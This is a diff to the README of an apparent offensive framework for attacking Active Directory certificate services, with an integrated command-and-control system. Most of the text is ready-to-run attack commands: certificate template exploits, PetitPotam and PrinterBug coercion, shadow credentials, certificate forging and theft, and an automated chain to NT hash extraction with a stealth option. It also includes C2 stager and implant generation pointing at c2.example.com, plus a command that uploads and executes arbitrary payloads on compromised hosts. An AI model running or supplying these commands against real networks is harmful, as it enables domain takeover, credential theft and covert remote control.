@@ -18,7 +18,7 @@ ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go
 
 ## Architecture
 - `cmd/certstrike/` — CLI entry points (cobra commands)
-- `pkg/pki/` — ADCS enumeration, ESC1-14 exploitation, certificate enrollment, NTLM auth, PetitPotam coercion, shadow credentials, certificate forging, reporting
+- `pkg/pki/` — ADCS enumeration, ESC1-14 exploitation, certificate enrollment (HTTP+RPC+CMC), PKINIT authentication, UnPAC-the-hash, NTLM auth, PetitPotam/PrinterBug coercion, shadow credentials, certificate forging, reporting
 - `pkg/c2/` — HTTP/HTTPS C2 listener, session management, cert-auth implants, polling agent, file delivery/deploy
 - `internal/mcp/` — MCP stdio server (5 tools)
 - `internal/tui/` — Bubbletea operator console with live C2 polling
@@ -57,7 +57,8 @@ cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
 - UnPAC-the-hash (U2U TGS-REQ, PAC_CREDENTIAL_INFO decryption, NT hash extraction)
 - Certificate theft: THEFT4 automated via LDAP userCertificate extraction; THEFT1-3,5 guidance playbooks
 - External-tool guidance generation (certipy, Rubeus, impacket) as fallback
-- PetitPotam MS-EFSRPC coercion (SMB2 + DCE/RPC, stateful session)
+- PetitPotam MS-EFSRPC coercion (SMB2 + DCE/RPC, unauthenticated, stateful session)
+- PrinterBug MS-RPRN coercion (SMB2 + DCE/RPC, authenticated, RpcOpenPrinterEx + RpcRemoteFindFirstPrinterChangeNotificationEx)
 - WebDAV coercion for non-admin pivot relay (`--listener-port` for custom port >1024)
 
 ### C2 Framework
@@ -68,6 +69,7 @@ cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
 - File delivery: upload and deploy arbitrary binaries to agents
 - Deploy command: `certstrike deploy --c2-url <url> --session <ID> --file ./payload --path /tmp/svc --execute`
 - Agent command output capped at 10MB (OOM prevention)
+- Operator API: GET /api/sessions, POST /api/command, GET /api/results, POST /api/deploy, GET /health
 
 ### SmartPotato (Windows)
 - JuicyPotato — BITS COM object abuse + named pipe impersonation
@@ -106,32 +108,49 @@ certstrike shadow --add --target victim -k --ccache user.ccache --target-dc dc01
 
 # Exploit (--esc accepts 1-14)
 certstrike pki --esc 1 --template Vuln --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
+certstrike pki --esc 3 --template AgentTemplate --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --esc 4 --template WritableTemplate --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --esc 7 --ca CorpCA --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
-certstrike pki --esc 9 --template NoSecExt --upn admin@corp.local --attacker-dn "CN=..." --target-dc dc01 --domain corp.local -u user -p pass
+certstrike pki --esc 9 --template NoSecExt --upn admin@corp.local --attacker-dn attacker --target-dc dc01 --domain corp.local -u user -p pass
 
-# Relay attacks with auto-coercion
+# Scan-only ESC paths (detection + guidance, --json supported)
+certstrike pki --esc 5 --target-dc dc01 --domain corp.local -u user -p pass
+certstrike pki --esc 10 --target-dc dc01 --domain corp.local -u user -p pass --json
+certstrike pki --esc 14 --target-dc dc01 --domain corp.local -u user -p pass
+
+# Relay attacks with auto-coercion (PetitPotam)
 certstrike pki --esc 8 --template Machine --target-dc dc01 --domain corp.local -u user -p pass --listener-ip 10.0.0.5
 certstrike pki --esc 8 --template Machine --target-dc dc01 --domain corp.local -u user -p pass --listener-ip 10.0.0.5 --listener-port 8080
 
 # Certificate operations
 certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
+certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt --json
 certstrike pki --import-pfx cert.pfx
-certstrike pki --theft all
+
+# Certificate theft
+certstrike pki --theft all                                                                           # playbook for all techniques
+certstrike pki --theft 4 --target-dc dc01 --domain corp.local -u user -p pass                       # THEFT4: real LDAP extraction
+certstrike pki --theft 4 --target-dc dc01 --domain corp.local -u user -p pass --ldaps -o certs_out  # with LDAPS + custom output dir
+
+# Engagement reporting
 certstrike pki --report --format markdown --output findings.md --target-dc dc01 --domain corp.local -u user -p pass
 
-# Shadow Credentials
-certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" --target-dc dc01 --domain corp.local -u user -p pass
-certstrike shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" --target-dc dc01 --domain corp.local -u user -p pass
-certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" --device-id <guid> --target-dc dc01 --domain corp.local -u user -p pass
+# Shadow Credentials (accepts sAMAccountName — auto-resolves DN via LDAP)
+certstrike shadow --add --target victim --target-dc dc01 --domain corp.local -u user -p pass
+certstrike shadow --add --target victim --target-dc dc01 --domain corp.local -u user -p pass --ldaps
+certstrike shadow --list --target victim --target-dc dc01 --domain corp.local -u user -p pass
+certstrike shadow --remove --target victim --device-id <guid> --target-dc dc01 --domain corp.local -u user -p pass
 
-# Auto-pwn
+# Auto-pwn (enumerate → exploit → PKINIT → UnPAC-the-hash → NT hash)
 certstrike auto --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
+certstrike auto --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass --ldaps --stealth
 certstrike auto --dry-run --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
 certstrike auto -i --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass  # interactive path selection
 
 # C2
-certstrike c2 --port 8443 --protocol https
+certstrike c2 --bind 0.0.0.0 --port 8443 --protocol https
+certstrike c2 --generate-stager --c2-url https://c2.example.com:8443 --output stager.json
+certstrike c2 --implant-type cert-auth --upn admin@corp.local --c2-url https://c2.example.com:8443
 certstrike agent --config stager.json
 certstrike deploy --c2-url http://localhost:8443 --session <ID> --file ./stager --path /tmp/svc --execute
 certstrike console --c2-url http://localhost:8080
